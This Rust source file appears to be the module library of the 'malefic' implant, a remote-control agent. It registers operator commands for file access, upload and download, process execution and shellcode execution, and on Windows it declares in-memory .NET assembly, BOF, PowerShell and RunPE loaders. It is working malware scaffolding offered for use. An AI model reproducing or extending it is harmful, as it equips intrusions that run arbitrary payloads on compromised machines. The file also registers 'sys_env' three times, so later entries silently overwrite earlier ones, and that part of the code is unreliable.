#![feature(stmt_expr_attributes)]
#![feature(type_alias_impl_trait)]
pub mod net;
pub mod fs;
pub mod sys;
mod r#macro;

use async_trait::async_trait;
use std::collections::HashMap;
use thiserror::Error;
use malefic_helper::protobuf::implantpb;
use malefic_helper::protobuf::implantpb::spite::Body;
use malefic_helper::protobuf::implantpb::Status;
pub type MaleficModule = dyn Module + Send + Sync + 'static;
pub type Output = async_std::channel::Sender<TaskResult>;
pub type Input = async_std::channel::Receiver<Body>;
pub type Result = anyhow::Result<TaskResult>;

#[derive(Error, Debug)]
pub enum TaskError {
    #[error(transparent)]
    OperatorError(#[from] anyhow::Error),

    #[error("")]
    NotExpectBody,

    #[error("{msg}")]
    FieldRequired { msg: String },

    #[error("{msg}")]
    FieldLengthMismatch { msg: String },

    #[error("{msg}")]
    FieldInvalid {msg: String},

    #[error("")]
    NotImpl,
}

impl TaskError {
    pub fn id(&self) -> i32 {
        match self {
            TaskError::OperatorError { .. }  => 2,
            TaskError::NotExpectBody => 3,
            TaskError::FieldRequired {..} => 4,
            TaskError::FieldLengthMismatch {..} => 5,
            TaskError::FieldInvalid {..} => 6,
            TaskError::NotImpl => 99,
        }
    }
}

#[derive(Clone,Debug)]
pub struct TaskResult {
    pub task_id: u32,
    pub body: Body,
    pub status: Status
}

impl TaskResult {
    fn new(task_id: u32) -> Self {
        TaskResult {
            task_id,
            body: Body::Empty(Default::default()), // 直接使用传入的Body实例
            status: Status {
                task_id,
                status:  0,
                error: String::default(),
                msg: None
            }
        }
    }

    pub fn new_with_body(task_id: u32, body: Body) -> Self {
        TaskResult {
            task_id,
            body,
            status: Status {
                task_id,
                status:  0,
                error: String::default(),
                msg: None
            }
        }
    }

    // downloadResponse
    pub fn new_with_download_response(task_id: u32,body: Body) -> Self {
        TaskResult {
            task_id,
            body,
            status: Status {
                task_id,
                status:  0,
                error: String::default(),
                msg: None
            }
        }
    }

    pub fn new_with_ack(task_id:u32, id:u32) -> Self {
        TaskResult {
            task_id,
            status: Status {
                task_id,
                status:  0,
                error: String::default(),
                msg: None,
            },
            body: Body::AsyncAck(implantpb::AsyncAck{
                id,
                success: true,
                end: false,
            }),
        }
    }

    pub fn new_with_error(task_id: u32, task_error: TaskError) -> Self{
        TaskResult {
            task_id,
            body: Body::Empty(Default::default()), // 直接使用传入的Body实例
            status: Status {
                task_id,
                status: task_error.id(),  // module error
                error: task_error.to_string(),
                msg: None
            }
        }
    }
    pub fn to_spite(&self) -> implantpb::Spite {
        implantpb::Spite {
            task_id: self.task_id,
            r#async: true,
            timeout: 0,
            name: String::new(),
            error: 0,
            status: Some(self.status.clone()),
            body: Some(self.body.clone()),
        }
    }
}


// 定义扩展trait
#[async_trait]
pub trait Module {
    fn name() -> &'static str where Self: Sized;
    fn new() -> Self where Self: Sized;
    fn new_instance(&self) -> Box<MaleficModule>;
    async fn run(&mut self,
                 id: u32,
                 recv_channel: &mut Input,
                 send_channel: &mut Output) -> Result;
}


#[no_mangle]
#[allow(improper_ctypes_definitions)]
pub extern "C" fn register_modules() -> HashMap<String, Box<MaleficModule>> {
    let mut map: HashMap<String, Box<MaleficModule>> = HashMap::new();

    // if cfg!(debug_assertions) {
    //     map.insert(misc::example::Example::name().to_string(), Box::new(misc::example::Example::new()));
    // }

    // fs
    #[cfg(feature = "fs")]
    {
        register_module!(map, "fs_pwd", fs::pwd::Pwd);
        register_module!(map, "fs_cd", fs::cd::Cd);
        register_module!(map, "fs_ls", fs::ls::Ls);
        register_module!(map, "fs_rm", fs::rm::Rm);
        register_module!(map, "fs_mv", fs::mv::Mv);
        register_module!(map, "fs_cp", fs::cp::Cp);
        register_module!(map, "fs_mkdir", fs::mkdir::Mkdir);
        register_module!(map, "fs_cat", fs::cat::Cat);


        #[cfg(target_family = "unix")]
        register_module!(map, "fs_chmod", fs::chmod::Chmod);
        #[cfg(target_family = "unix")]
        register_module!(map, "fs_chown", fs::chown::Chown);

    }
    #[cfg(feature = "net")]
    {
        register_module!(map, "net_upload", net::upload::Upload);
        register_module!(map, "net_download", net::download::Download);
        // register_module!(map, "net_curl", net::curl::Curl);
    }
    #[cfg(feature = "sys")]
    {
        register_module!(map, "sys_exec", sys::exec::Exec);
        register_module!(map, "sys_execute_shellcode", sys::execute_shellcode::ExecuteShellcode);
        register_module!(map, "sys_kill", sys::kill::Kill);
        register_module!(map, "sys_whoami", sys::whoami::Whoami);
        register_module!(map, "sys_env", sys::env::Env);
        register_module!(map, "sys_env", sys::env::Setenv);
        register_module!(map, "sys_env", sys::env::Unsetenv);
        register_module!(map, "sys_ps", sys::ps::Ps);
        register_module!(map, "sys_netstat", sys::netstat::Netstat);
        register_module!(map, "sys_info", sys::info::SysInfo);

        #[cfg(target_os = "windows")] {
            register_module!(map, "sys_execute_bof", sys::execute_bof::ExecuteBof);
            register_module!(map, "sys_execute_assembly", sys::execute_assemble::ExecuteAssembly);
            register_module!(map, "sys_execute_powershell", sys::execute_powershell::ExecutePowershell);
            register_module!(map, "sys_execute_pe", sys::execute_pe::ExecutePE);
        }
    }
    map
}

#[cfg(target_os = "windows")]
#[cfg(feature = "community")]
#[link(name="malefic_win_kit", kind="dylib")]
extern "C" {
    fn MaleficExecAssembleInMemory(data: *const u8, data_len: usize, args: *const *const u8, args_len: usize) -> *const u8;
    fn MaleficBofLoader(buffer: *const u8, 
        buffer_len: usize, 
        arguments: *const *const u8,
        arguments_len: usize,
        entrypoint_name: *const u8) -> *const u8;
    fn MaleficPwshExecCommand(command: *const u8, command_len: usize) -> *const u8;
    fn MaleficLoadLibrary(
        flags: u32,
        buffer: winapi::shared::ntdef::LPCWSTR,
        file_buffer: *const core::ffi::c_void,
        len: usize,
        name: *const u8,
    ) -> *const core::ffi::c_void;
    fn RunPE(
        path: *const u8, 
        data: *const u8,
        data_size: usize,
        is_x86: bool,
        pid: u32,
        block_dll: bool,
        need_output: bool
    ) -> *const u8;
}

#[cfg(target_os = "windows")]
#[cfg(feature = "community")]
pub const LOAD_MEMORY: u16 = 0x02u16;
#[cfg(target_os = "windows")]
#[cfg(feature = "community")]
pub const AUTO_RUN_DLL_MAIN: u32 = 0x00010000u32;